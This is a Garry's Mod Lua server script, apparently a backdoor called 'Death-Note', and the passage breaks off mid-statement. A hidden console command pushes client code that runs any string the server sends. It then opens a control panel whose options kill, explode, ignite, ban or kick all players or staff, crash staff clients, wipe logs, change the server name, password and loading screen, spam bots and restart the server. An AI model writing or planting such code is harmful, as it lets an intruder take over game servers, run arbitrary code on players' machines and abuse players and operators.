util.AddNetworkString("SENDTEST")
util.AddNetworkString("echangeinfo")

concommand.Add("ghost_dn", function(ply, cmd, args)
		ply:SendLua("net.Receive(\"SENDTEST\",function()RunString(net.ReadString())end)")
		net.Start("SENDTEST")
		net.WriteString([[
		surface.CreateFont( "APG_title_font", 
		{
		    font = "Arial",
		    size = 14,
		    weight = 700,
		})
surface.CreateFont( "APG_sideBar_font",
{
    font = "Arial",
    size = 18,
    weight = 1500,
})

surface.CreateFont( "APG_mainPanel_font",
{
    font = "Arial",
    size = 19,
    weight = 8500,
})

function actioneff(aff)
	hook.Add( "HUDPaint", "infohud", function()
		draw.SimpleTextOutlined(
        aff,
        "DermaLarge",
        ScrW() /2 ,
        40,
        Color( 255, 0, 0, 255 ),
        TEXT_ALIGN_CENTER,
        TEXT_ALIGN_CENTER,
        1,
        Color( 0, 0, 255 )
    )
end)
	timer.Simple( 3, function() hook.Remove( "HUDPaint", "infohud" ) end )
end

local main_color = Color(32, 255, 0,255)


    local Frame = vgui.Create( "DFrame" )
        Frame:SetSize( ScrW() -200, ScrH() -200)
        Frame:SetPos( ScrW()/2- Frame:GetWide()/2, ScrH()/2 - Frame:GetTall()/2)
        Frame:SetTitle( "" )
        Frame:SetVisible( true )
        Frame:SetDraggable( true )
        Frame:MakePopup()
        Frame:ShowCloseButton(false)
        Frame:SetIcon( "icon16/bug.png" )
        Frame.Paint = function(i,w,h)
            draw.RoundedBox(4,0,0,w,h,Color(34, 34, 34,255))
            draw.RoundedBox(0,0,23,w,1,main_color)
            local name = "      Death-Note "
            draw.DrawText( name, "APG_title_font",8, 5, Color( 189, 189, 189), 3 )
        end
    local closeButton = vgui.Create("DButton",Frame)
        closeButton:SetPos(Frame:GetWide() - 20,4)
        closeButton:SetSize(16,16)
        closeButton:SetText('')
        closeButton.DoClick = function()
            Frame:Remove()
        end
        closeButton.Paint = function(i,w,h)
            draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255,3))
            draw.DrawText( "âœ•", "APG_sideBar_font",0, -2, Color( 189, 189, 189), 3 )
        end
		
		
local Button = vgui.Create( "DButton", Frame )
Button:SetText( "" )
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( (Frame:GetWide() / 2) - 60,40 )
Button:SetSize( 120, 30 )
        Button.UpdateColours = function( label, skin )
            label:SetTextStyleColor( Color( 189, 189, 189 ) )
        end
		
		        Button.Paint = function(slf, w, h)

            draw.RoundedBox(0,0,h*0.85,w-5,1, Color(0, 96, 0,255))
            local text = "Tout le monde"
            draw.DrawText( text, "APG_mainPanel_font",5, 8, Color( 189, 189, 189), 3 )
        end
		
		
Button.DoClick = function()
	local m = DermaMenu()
local infoserver, infoservericon = m:AddSubMenu( "Serveur" )
infoservericon:SetIcon( "icon16/bug.png" )
m:AddSpacer()
local meutreall, meutreiconall = m:AddSubMenu( "Meutre" )
meutreiconall:SetIcon( "icon16/bomb.png" )
m:AddSpacer()
local ulxall, ulxallicon = m:AddSubMenu( "Commandes" )
ulxallicon:SetIcon( "icon16/script_add.png" )
local notificationall, notificationallicon = ulxall:AddSubMenu( "Notification" )
notificationallicon:SetIcon( "icon16/briefcase.png" )
local meutreallsub, meutreallsubicon = meutreall:AddSubMenu( "Tuer" )
meutreallsubicon:SetIcon( "icon16/delete.png" )
local meutreallssub, meutreallssubicon = meutreall:AddSubMenu( "Tuer(silencieux)" )
meutreallssubicon:SetIcon( "icon16/delete.png" )
local explosesub, explosesubicon = meutreall:AddSubMenu( "Exploser" )
explosesubicon:SetIcon( "icon16/delete.png" )
local igniteallssub, igniteallssubicon = meutreall:AddSubMenu( "Bruler" )
igniteallssubicon:SetIcon( "icon16/delete.png" )
local kicksub, kicksubicon = ulxall:AddSubMenu( "Kick" )
kicksubicon:SetIcon( "icon16/status_away.png" )
local bansub, bansubicon = ulxall:AddSubMenu( "Ban" )
bansubicon:SetIcon( "icon16/status_busy.png" )
local freezesub, freezesubicon = ulxall:AddSubMenu( "Freeze" )
freezesubicon:SetIcon( "icon16/stop.png" )
local unfreezesub, unfreezesubicon = ulxall:AddSubMenu( "Unfreeze" )
unfreezesubicon:SetIcon( "icon16/accept.png" )
local noclipsub, noclipsubicon = ulxall:AddSubMenu( "NOCLIP" )
noclipsubicon:SetIcon( "icon16/drive_user.png" )
m:AddSpacer()



local animationall, animationallicon = m:AddSubMenu( "Animation" )
animationallicon:SetIcon( "icon16/wand.png" )
local animationallsubsalute, animationallsubiconsalute = animationall:AddSubMenu( "Saluer" )
animationallsubiconsalute:SetIcon( "icon16/wand.png" )
local animationallsubrobot, animationallsubiconrobot = animationall:AddSubMenu( "Robot" )
animationallsubiconrobot:SetIcon( "icon16/wand.png" )
m:AddSpacer()
local animationallsubcheer, animationallsubiconcheer = animationall:AddSubMenu( "Levez les mains" )
animationallsubiconcheer:SetIcon( "icon16/wand.png" )
local animationallsublaugh, animationallsubiconlaugh = animationall:AddSubMenu( "Rire" )
animationallsubiconlaugh:SetIcon( "icon16/wand.png" )
local animationallsubmuscle, animationallsubiconmuscle = animationall:AddSubMenu( "Danse Sexy!" )
animationallsubiconmuscle:SetIcon( "icon16/wand.png" )
local animationallsubpersistence, animationallsubiconpersistence = animationall:AddSubMenu( "Faire le beau!" )
animationallsubiconpersistence:SetIcon( "icon16/wand.png" )
local animationallsubdance, animationallsubicondance = animationall:AddSubMenu( "Danse!" )
animationallsubicondance:SetIcon( "icon16/wand.png" )
local moovesall, moovesiconall = m:AddSubMenu( "Mouvement" )
moovesiconall:SetIcon( "icon16/controller.png" )
m:AddSpacer()
local trollall, trollallicon = m:AddSubMenu( "Troll Menu" )
trollallicon:SetIcon( "icon16/rainbow.png" )
local spamchat, spamchaticon = trollall:AddSubMenu( "Spam Chat" )
spamchaticon:SetIcon( "icon16/application_form.png" )
local nuke, nukeicon = trollall:AddSubMenu( "Nuke" )
nukeicon:SetIcon( "icon16/lightning.png" )

local mooveall, mooveallicon = trollall:AddSubMenu( "Mouvement" )
mooveallicon:SetIcon( "icon16/bug_error.png" )

local jumpbreakall, jumpbreakallicon = trollall:AddSubMenu( "Jump Break" )
jumpbreakallicon:SetIcon( "icon16/rainbow.png" )

local gravitesub, gravitesubicon = trollall:AddSubMenu( "GravitÃƒÂ© Break" )
gravitesubicon:SetIcon( "icon16/rainbow.png" )

local physiquesub, physiqueicon = trollall:AddSubMenu( "Physique Break" )
physiqueicon:SetIcon( "icon16/rainbow.png" )

local quakeearth, quakeearthicon = trollall:AddSubMenu( "Tremblement" )
quakeearthicon:SetIcon( "icon16/rainbow.png" )

local prisonsub, prisonsubicon = trollall:AddSubMenu( "Prison" )
prisonsubicon:SetIcon( "icon16/user_orange.png" )

ulxall:AddOption( "CleanUP", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("cleanup")
	 net.WriteEntity( userl )
	 net.SendToServer()
 end ):SetIcon( "icon16/cut.png" )
bansub:AddOption( "ALL", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("banall")
	 net.WriteEntity( userl )
	 net.SendToServer()
 end ):SetIcon( "icon16/user.png" )

bansub:AddOption( "STAFF", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("banallstaff")
	 net.WriteEntity( userl )
	 net.SendToServer()
 end ):SetIcon( "icon16/user_gray.png" )

kicksub:AddOption( "ALL", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Raison..." )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("kickall")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/user.png" )

kicksub:AddOption( "STAFF", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Raison..." )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("kickallstaff")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/user_gray.png" ) 

notificationall:AddOption( "Generic", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Message..." )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("notification_generic")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/lightbulb_off.png" )

notificationall:AddOption( "Error", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Message..." )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("notification_error")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/cancel.png" )

notificationall:AddOption( "Undo", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Message..." )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("notification_undo")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/arrow_undo.png" )

notificationall:AddOption( "Hint", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Message..." )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("notification_hint")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/cut.png" )

notificationall:AddOption( "Cleanup", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Message..." )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("notification_cleanup")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/information.png" )

meutreallsub:AddOption( "ALL", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("killall")
	 net.WriteEntity( userl )
	 net.SendToServer()
end ):SetIcon( "icon16/user.png" )
meutreallsub:AddOption( "STAFF", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("killallstaff")
	 net.WriteEntity( userl )
	 net.SendToServer()
end ):SetIcon( "icon16/user_gray.png" )
meutreallssub:AddOption( "ALL", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("allkillusersilence")
	 net.WriteEntity( userl )
	 net.SendToServer()
end ):SetIcon( "icon16/user.png" )
meutreallssub:AddOption( "STAFF", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("allkillusersilencestaff")
	 net.WriteEntity( userl )
	 net.SendToServer()
end ):SetIcon( "icon16/user_gray.png" )

explosesub:AddOption( "ALL", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("exploseall")
	 net.WriteEntity( userl )
	 net.SendToServer()
end ):SetIcon( "icon16/user.png" )
explosesub:AddOption( "STAFF", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("explosestaff")
	 net.WriteEntity( userl )
	 net.SendToServer()
end ):SetIcon( "icon16/user_gray.png" )

igniteallssub:AddOption( "ALL", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("igniteall")
	 net.WriteEntity( userl )
	 net.SendToServer()
end ):SetIcon( "icon16/user.png" )
igniteallssub:AddOption( "STAFF", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("igniteallstaff")
	 net.WriteEntity( userl )
	 net.SendToServer()
end ):SetIcon( "icon16/user_gray.png" )

freezesub:AddOption( "ALL", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("freezeall")
	 net.WriteEntity( userl )
	 net.SendToServer()
 end ):SetIcon( "icon16/user.png" )
freezesub:AddOption( "STAFF", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("freezeallstaff")
	 net.WriteEntity( userl )
	 net.SendToServer()
end ):SetIcon( "icon16/user_gray.png" ) 
unfreezesub:AddOption( "ALL", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("unfreezeall")
	 net.WriteEntity( userl )
	 net.SendToServer()
 end ):SetIcon( "icon16/user.png" )

unfreezesub:AddOption( "STAFF", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("unfreezeallstaff")
	 net.WriteEntity( userl )
	 net.SendToServer()
end ):SetIcon( "icon16/user_gray.png" )

noclipsub:AddOption( "[ON]", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("noclipallon")
	 net.WriteEntity( userl )
	 net.SendToServer()
 end ):SetIcon( "icon16/accept.png" )

noclipsub:AddOption( "[OFF]", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("noclipalloff")
	 net.WriteEntity( userl )
	 net.SendToServer()
end ):SetIcon( "icon16/cancel.png" )

ulxall:AddOption( "Ajoute 11Ã¢â€šÂ¬ toutes les 0.1s", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("addmoneyall")
	 net.WriteEntity( userl )
	 net.SendToServer()
end ):SetIcon( "icon16/money_add.png" )

ulxall:AddOption( "Ajouter de l'argent", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "500" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("addmoneyalls")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/money_add.png" ) 

ulxall:AddOption( "Point de vie", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "100" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("healall")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/heart.png" ) 

ulxall:AddOption( "Point d'armure", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "250" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("armorall")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/user_suit.png" ) 

trollall:AddOption( "Launch", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("launchall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/arrow_up.png" )

trollall:AddOption( "2D Players", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("2dplayerall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bug.png" )

trollall:AddOption( "Donner la grosse tÃƒÂªte Ãƒ  tous les joueurs", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("grossetete")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bug.png" )

trollall:AddOption( "Changer la taille des joueurs", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "5" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("scaleall")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/application_edit.png" )

trollall:AddOption( "Hurlement sur tous les joueurs", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("hurlement")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

trollall:AddOption( "Faire crash [STAFF]", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("crashadminvip")
	 net.WriteEntity( userl )
	 net.SendToServer()
end ) :SetIcon( "icon16/disconnect.png" )

spamchat:AddOption( "[ON]", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("spamchat")
	 net.WriteEntity( userl )
	 net.SendToServer()
end ) :SetIcon( "icon16/accept.png" )

spamchat:AddOption( "[OFF]", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("spamchatstop")
	 net.WriteEntity( userl )
	 net.SendToServer()
end ) :SetIcon( "icon16/cancel.png" )

mooveall:AddOption( "[ON]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("moovetrollall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/accept.png" ) 

mooveall:AddOption( "[OFF]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("unmoovetrollall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/cancel.png" )

jumpbreakall:AddOption( "ON", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("jump")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

jumpbreakall:AddOption( "OFF", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("retablirjumpall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/cancel.png" )

moovesall:AddOption( "[ON]Avancer", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("forwardmooveall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

moovesall:AddOption( "[OFF]Avancer", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("unforwardmooveall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/stop.png" )

moovesall:AddOption( "[ON]Reculer", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("backmooveall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

moovesall:AddOption( "[OFF]Reculer", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("unbackmooveall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/stop.png" )

moovesall:AddOption( "[ON]Tourner Ãƒ  gauche", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("leftmooveall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

moovesall:AddOption( "[OFF]Tourner Ãƒ  gauche", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("unleftmooveall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/stop.png" )

moovesall:AddOption( "[ON]Tourner Ãƒ  droite", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("rightmooveall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

moovesall:AddOption( "[OFF]Tourner Ãƒ  droite", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("unrightmooveall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/stop.png" )

moovesall:AddOption( "[ON]S'accroupir", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("squatmooveall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

moovesall:AddOption( "[OFF]S'accroupir", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("unsquatmooveall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/stop.png" )

infoserver:AddOption( "Enlever les logs", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("logsremove")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/cog_delete.png" )

infoserver:AddOption( "Changer le nom du serveur", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "â– â–‚ â–ƒ â–„ â–… â–† â–‡Ä¤áºªÄˆÐŒÄ’ÄŽ à¸¿Â¥ Ä”ÏÄ¨Ä©Ä†áº¤ Å¤ÎˆÇºMâ–ˆ â–‡ â–† â–… â–„ â–‚ â–" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("changename")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/server_edit.png" ) 

infoserver:AddOption( "Changer l'ÃƒÂ©cran de chargement", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "https://pornhub.com" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("changeload")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/server_edit.png" ) 

infoserver:AddOption( "Autoriser les scripts client (0 ou 1)", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "1" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("allowcsluads")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/server_edit.png" )

infoserver:AddOption( "Mettre un mot de passe sur le serveur", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "secure" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("secureinfo")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/server_edit.png" )

infoserver:AddOption( "Bot spam", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "Nombre de Bot ?" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "5" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("botspam")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/user.png" )

infoserver:AddOption( "Changer le nom de tous les joueurs", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("namechanger")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/server_database.png" )

infoserver:AddOption( "Changer le nom de tous les joueurs[SPAM]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("namechangerspam")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/server_database.png" )

infoserver:AddOption( "Name Changer[OFF]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("namechangerstop")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/server_database.png" ) 

infoserver:AddOption( "RedÃƒÂ©marrer serveur", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("restartserver")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/server_go.png" )

gravitesub:AddOption( "ON", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("cassergrall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

gravitesub:AddOption( "OFF", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("retablirgrall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/cancel.png" )

physiquesub:AddOption( "ON", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("physicgamestyle")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

physiquesub:AddOption( "OFF", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("retablirphysicgamestyle")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/cancel.png" )

quakeearth:AddOption( "ON", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("earthquakeonall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

trollall:AddOption( "GL0B4L H4CK", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("globalhack")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/application_xp_terminal.png" )

trollall:AddOption( "D4NC3 FL00R! ", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("dancefloor")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/rainbow.png" )


animationallsubsalute:AddOption( "1 fois", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_salute")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubsalute:AddOption( "en boucle", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_salute_loop")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubrobot:AddOption( "1 fois", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_robot")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )
animationallsubrobot:AddOption( "en boucle", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_robot_loop")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubcheer:AddOption( "1 fois", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_cheer")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )
animationallsubcheer:AddOption( "en boucle", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_cheer_loop")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsublaugh:AddOption( "1 fois", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_laugh")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsublaugh:AddOption( "en boucle", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_laugh_loop")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubmuscle:AddOption( "1 fois", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_muscle")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubmuscle:AddOption( "en boucle", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_muscle_loop")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubpersistence:AddOption( "1 fois", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_persistence")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubpersistence:AddOption( "en boucle", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_persistence_loop")
